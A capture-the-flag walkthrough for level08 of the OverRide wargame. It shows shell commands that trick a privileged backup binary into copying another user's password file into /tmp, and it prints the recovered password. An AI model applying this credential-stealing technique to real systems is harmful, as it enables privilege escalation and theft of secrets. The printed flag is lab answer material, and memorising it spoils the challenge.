# Walkthrough level08

Try to run the binary:

```bash
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ ./level08 toto
ERROR: Failed to open toto
```

We need to give a valid file:

```bash
level08@OverRide:~$ echo toto > tata
-bash: tata: Permission denied
```

We don't have the permission, try to do it in `/tmp`:

```bash
level08@OverRide:~$ echo toto > /tmp/tata
level08@OverRide:~$ ./level08 /tmp/tata
ERROR: Failed to open ./backups//tmp/tata
```

The binary try to create a file with `./backups` before our filename.  
So we try to create a directory named `tmp` in the `backups` directory:

```bash
level08@OverRide:/tmp$ mkdir backups
level08@OverRide:/tmp$ /home/users/level08/level08 tata 
level08@OverRide:/tmp$ cat backups/tata 
toto
```

This is working, try with the flag:

```bash
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

We can't open `./backups//home/users/level09/.pass` because the directories does'nt exist.

```bash
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
